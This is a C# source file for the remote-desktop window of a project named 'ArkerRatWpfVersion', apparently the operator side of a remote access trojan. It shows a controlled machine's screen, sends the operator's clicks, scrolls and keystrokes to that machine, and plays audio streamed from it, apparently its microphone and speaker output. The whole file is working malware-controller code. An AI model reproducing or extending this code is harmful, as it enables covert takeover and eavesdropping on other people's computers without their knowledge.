using ArkerRatWpfVersion;
using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.Drawing.Imaging;
using System.IO;
using System.Threading;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Input;
using System.Windows.Media;
using System.Windows.Media.Animation;
using System.Windows.Media.Imaging;
using NAudio.Wave;
using System.Diagnostics;
using System.Windows.Markup;

namespace ArkerRatWpfVersion
{
    /// <summary>
    /// Interaction logic for RemoteDesktopWindow.xaml
    /// </summary>
    public partial class RemoteDesktopWindow : Window
    {
        public RATHostSession clientSession { get; set; }

        public RemoteDesktopWindow(RATHostSession session)
        {
            InitializeComponent();


            clientSession = session;
            windowText.Content +=" - "+(clientSession.clientInfo.Split('\t'))[0];

GlobalVariables.byteSize = 262144;
            lock (GlobalVariables._lock)
            {
                clientSession.data = "§PingStart§§PingEnd§";
            }

            Task.Run(()=> FrameBuffer());
            Task.Run(()=> StartReceivingAudio());
            //ResetWhenTheDelayOfFramesIsToLarge();

            clientSession.remoteDesktopWindowIsAlreadyOpen = true;
            this.PreviewKeyDown += new KeyEventHandler(SendKeystrokesToClient);
            this.PreviewMouseWheel += new MouseWheelEventHandler(SendScrollToClient);
            remoteDesktopVideoFrame.Stretch = Stretch.Fill;
            Task.Delay(300);
            clientSession.SendData("§RemoteDesktopStart§§RemoteDesktopEnd§");
        }
        bool close = false;
        private void Window_Closing(object sender, System.ComponentModel.CancelEventArgs e)
        {
            if (!close)
                e.Cancel = true;
        }

        private async void SendScrollToClient(object sender, MouseWheelEventArgs e)
        {
            e.Handled = true; // Mark the event as handled to prevent it from bubbling up to the window

            Point relativeClickPos = e.GetPosition(remoteDesktopVideoFrame);

            double clickX = relativeClickPos.X * Convert.ToDouble(clientSession.resulotion[1]) / remoteDesktopVideoFrame.ActualWidth;
            double clickY = relativeClickPos.Y * Convert.ToDouble(clientSession.resulotion[0]) / remoteDesktopVideoFrame.ActualHeight;

            await clientSession.SendData("§RemoteDesktopStart§§ClickPositionStart§" + Convert.ToString(clickX) + "," + Convert.ToString(clickY) + "," + e.Delta.ToString() + "§ClickPositionEnd§§RemoteDesktopEnd§");
        }
        private async void SendKeystrokesToClient(object sender, KeyEventArgs e)
        {
            e.Handled = true;
            await clientSession.SendData("§RemoteDesktopStart§" + "§KI§"+e.Key.ToString().ToLower()+"§RemoteDesktopEnd§");
        }

        public async void CloseWindow(object sender, RoutedEventArgs e)
        {
            await clientSession.SendData("§RemoteDesktopStart§close§RemoteDesktopEnd§");
            StopReceivingAudio();
            clientSession.remoteDesktopWindowIsAlreadyOpen = false;
            frameQue = new ConcurrentQueue<string>();
            clientAudioQue = new ConcurrentQueue<string>();



            while (frameQue.Count > 0 || clientAudioQue.Count > 0)
            {
                await Task.Delay(100);
            }
            await Task.Delay(500);

            lock (GlobalVariables._lock)
            {
                clientSession.data = "§PingStart§§PingEnd§";
            }

            GlobalVariables.byteSize = 1024;
            close = true;
            Close();
        }

        bool zoom = true;
        private void MaximizeWindow(object sender, RoutedEventArgs e)
        {
            if (zoom)
            {
                this.Width = this.Width * 2;
                this.Height = this.Height * 2;
                zoom = false;
            }
            else
            {
                this.Width = this.Width / 2;
                this.Height = this.Height / 2;
                zoom = true;
            }

        }

        private void MinimizeWindow(object sender, RoutedEventArgs e)
        {
            this.WindowState = WindowState.Minimized;
        }

        private async void ImageControl_PreviewMouseDown(object sender, MouseButtonEventArgs e)
        {
            e.Handled = true; // Mark the event as handled to prevent it from bubbling up to the window

            Point relativeClickPos = e.GetPosition(remoteDesktopVideoFrame);

            double clickX = relativeClickPos.X * Convert.ToDouble(clientSession.resulotion[1]) / remoteDesktopVideoFrame.ActualWidth;
            double clickY = relativeClickPos.Y * Convert.ToDouble(clientSession.resulotion[0]) / remoteDesktopVideoFrame.ActualHeight;

            await clientSession.SendData("§RemoteDesktopStart§§ClickPositionStart§" + Convert.ToString(clickX) + "," + Convert.ToString(clickY)+","+e.ChangedButton.ToString() + "§ClickPositionEnd§§RemoteDesktopEnd§");
        }

        private void Window_MouseDown(object sender, System.Windows.Input.MouseButtonEventArgs e)
        {
            if (e.LeftButton == System.Windows.Input.MouseButtonState.Pressed)
            {
                DragMove();
            }
        }

       

        public ConcurrentQueue<string> frameQue = new ConcurrentQueue<string>();
        public ConcurrentQueue<string> clientAudioQue = new ConcurrentQueue<string>();



        private async void FrameBuffer()
        {
               while (!clientSession.source.IsCancellationRequested && clientSession.remoteDesktopWindowIsAlreadyOpen)
               {
                   string temp = string.Empty;
                   frameQue.TryDequeue(out temp);

                   if (!string.IsNullOrEmpty(temp))
                   {
                        //Frame
                           ReceiveFrameChunk(temp);
                   }
            }
        }

   


        private BufferedWaveProvider waveProvider;
        private WaveOutEvent waveOut;
        private CancellationTokenSource cancellationSource;
        private Task audioTask;
        //private const int DelayThresholdMilliseconds = 1500;
        //private int currentDelayMilliseconds = 0;



        private const int DelayThresholdMilliseconds = 1500;
        private const int MaxBufferMilliseconds = 3000; // Maximum buffer size to prevent excessive buffering
        private int currentDelayMilliseconds = 0;
        private int desiredBufferMilliseconds = 500; // Initial buffer size

        private void StartReceivingAudio()
        {
            if (waveProvider == null)
            {
                waveProvider = new BufferedWaveProvider(new WaveFormat(41100, 1));
                waveOut = new WaveOutEvent();
                waveOut.DeviceNumber = 0;
                waveOut.Init(waveProvider);
                waveOut.Play();
            }

            if (cancellationSource == null)
            {
                cancellationSource = new CancellationTokenSource();
                audioTask = Task.Run(async () => await ReceiveAudioChunks(cancellationSource.Token));
            }
        }

        private async void StopReceivingAudio()
        {
            if (cancellationSource != null)
            {
                cancellationSource.Cancel();
                cancellationSource = null;
            }

            if (audioTask != null)
            {
                await audioTask;
                audioTask = null;
            }

            if (waveOut != null)
            {
                waveOut.Stop();
                waveOut.Dispose();
                waveOut = null;
            }

            if (waveProvider != null)
            {
                waveProvider.ClearBuffer();
                waveProvider = null;
            }
        }

        private async Task ReceiveAudioChunks(CancellationToken cancellationToken)
        {
            while (!cancellationToken.IsCancellationRequested && clientSession.remoteDesktopWindowIsAlreadyOpen)
            {
                if (clientAudioQue.Count > 10)
                    clientAudioQue = new ConcurrentQueue<string>();

                string dataIn = string.Empty;
                string dataOut = string.Empty;

                bool inReceived = false;
                bool outReceived = false;

                Task inTask = Task.Run(async() =>
                {
                    while (!cancellationToken.IsCancellationRequested && clientSession.remoteDesktopWindowIsAlreadyOpen && !inReceived && cAIVOn)
                    {
                        if (clientAudioQue.TryDequeue(out dataIn))
                        {
                            byte[] audioInBytes = Convert.FromBase64String(dataIn);
                            try
                            {
                                waveProvider.AddSamples(audioInBytes, 0, audioInBytes.Length);
                                inReceived = true;
                            }
                            catch (Exception ex)
                            {
                                // Handle the exception appropriately
                            }
                        }
                        await Task.Delay(10);
                    }
                });

                Task outTask = Task.Run(async() =>
                {
                    while (!cancellationToken.IsCancellationRequested && clientSession.remoteDesktopWindowIsAlreadyOpen && !outReceived && cAOVOn)
                    {
                        if (clientAudioQue.TryDequeue(out dataOut))
                        {
                            byte[] audioOutBytes = Convert.FromBase64String(dataOut);
                            try
                            {
                                waveProvider.AddSamples(audioOutBytes, 0, audioOutBytes.Length);
                                outReceived = true;
                            }
                            catch (Exception ex)
                            {
                                // Handle the exception appropriately
                            }
                        }
                        await Task.Delay(10);
                    }
                });

                await Task.WhenAll(inTask, outTask); // Wait until both in and out audio chunks are received

                // Calculate the current delay based on the buffered bytes
                int currentBufferedBytes = waveProvider.BufferedBytes;
                int currentBufferedMilliseconds = (int)((currentBufferedBytes / (float)waveProvider.WaveFormat.AverageBytesPerSecond) * 1000);
                currentDelayMilliseconds = currentBufferedMilliseconds - DelayThresholdMilliseconds;

                // Adjust the desired buffer size based on the current delay
                if (currentDelayMilliseconds >= DelayThresholdMilliseconds)
                {
                    desiredBufferMilliseconds = 250; // Decrease buffer size to speed up audio
                }
                else
                {
                    desiredBufferMilliseconds = 1000; // Restore original buffer size
                }
                try
                {
                    CombineAudioChunks();
                }
                catch (Exception ex) { }
                
                if (string.IsNullOrEmpty(dataIn) && string.IsNullOrEmpty(dataOut))
                {
                    await Task.Delay(10); // Delay to avoid hard looping
                }
            }
        }

        private void CombineAudioChunks()
        {
            byte[] inBuffer = new byte[waveProvider.BufferedBytes];
            byte[] outBuffer = new byte[waveProvider.BufferedBytes];
            int bytesReadIn = waveProvider.Read(inBuffer, 0, inBuffer.Length);
            int bytesReadOut = waveProvider.Read(outBuffer, 0, outBuffer.Length);
            waveProvider.ClearBuffer();

            int maxBytesRead = Math.Max(bytesReadIn, bytesReadOut);

            if (maxBytesRead > 0)
            {
                byte[] combinedBuffer = new byte[maxBytesRead];

                // Copy inBuffer to combinedBuffer
                Buffer.BlockCopy(inBuffer, 0, combinedBuffer, 0, bytesReadIn);

                // Mix outBuffer with combinedBuffer
                for (int i = 0; i < bytesReadOut; i += 2)
                {
                    short outSample = BitConverter.ToInt16(outBuffer, i);

                    if (i < bytesReadIn)
                    {
                        short combinedSample = BitConverter.ToInt16(combinedBuffer, i);

                        // Calculate the scaling factor based on the relative volume of the samples
                        float inVolume = Math.Abs(combinedSample) / (float)short.MaxValue;
                        float outVolume = Math.Abs(outSample) / (float)short.MaxValue;
                        float scalingFactor = inVolume / (inVolume + outVolume);

                        // Mix the samples with the scaling factor
                        short mixedSample = (short)((combinedSample * scalingFactor) + (outSample * (1 - scalingFactor)));

                        byte[] mixedBytes = BitConverter.GetBytes(mixedSample);
                        mixedBytes.CopyTo(combinedBuffer, i);
                    }
                    else
                    {
                        byte[] outBytes = BitConverter.GetBytes(outSample);
                        outBytes.CopyTo(combinedBuffer, i);
                    }
                }

                waveProvider.AddSamples(combinedBuffer, 0, maxBytesRead);
            }

            // Adjust the buffer size based on the desired buffer milliseconds
            int desiredBufferBytes = (int)((desiredBufferMilliseconds / 1000f) * waveProvider.WaveFormat.AverageBytesPerSecond);
            waveProvider.BufferLength = Math.Min(desiredBufferBytes, MaxBufferMilliseconds * waveProvider.WaveFormat.AverageBytesPerSecond / 1000);
        }

        private MemoryStream _frameStream = new MemoryStream();
        public async void ReceiveFrameChunk(string frameChunk)
        {
            if (frameChunk.Contains("§RemoteDesktopFrameDone§"))
            {
                byte[] frameBytes = CombineFrameChunks();
                _frameStream.SetLength(0); // Reset the stream

                await Application.Current.Dispatcher.InvokeAsync(() =>
                {
                    try
                    {
                        BitmapImage bitmapImage = new BitmapImage();
                        bitmapImage.BeginInit();
                        bitmapImage.CacheOption = BitmapCacheOption.OnLoad;
                        bitmapImage.StreamSource = new MemoryStream(frameBytes);
                        bitmapImage.EndInit();

                        remoteDesktopVideoFrame.Source = bitmapImage;
                    }
                    catch (Exception ex) { }
                });
            }
            else
            {
                try
                {
                    byte[] chunkBytes = Convert.FromBase64String(frameChunk);
                    await _frameStream.WriteAsync(chunkBytes, 0, chunkBytes.Length);

                }
                catch (Exception ex) { return; }
            }
        }

      

        private byte[] CombineFrameChunks()
        {
            byte[] frameBytes = _frameStream.ToArray();
            return frameBytes;
        }

        //_______
        public bool cAIVOn = false;
        private void CAIVOn(object sender, RoutedEventArgs e)
        {
            cAIVOn= true;
        }
        private void CAIVOff(object sender, RoutedEventArgs e)
        {
            cAIVOn = false;
       
    }

        //_______
        public bool cAOVOn = false;
        private void CAOVOn(object sender, RoutedEventArgs e)
        {
            cAOVOn= true;
        }
        private void CAOVOff(object sender, RoutedEventArgs e)
        {
            cAOVOn = false;
            
        }

    }
}
